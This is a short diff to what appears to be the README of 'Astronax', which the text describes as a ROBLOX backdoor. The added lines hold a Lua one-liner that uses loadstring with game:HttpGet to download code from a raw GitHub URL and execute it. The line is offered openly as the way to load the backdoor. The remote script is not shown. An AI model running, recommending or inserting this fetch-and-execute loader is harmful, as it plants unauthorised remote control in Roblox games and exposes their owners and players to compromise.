@@ -13,3 +13,6 @@ What is Astronax?
 ```swift
 Astronax is a ROBLOX backdoor.
 ```
+```lua
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DevDodger/Astronax/main/main.lua"))()
+```
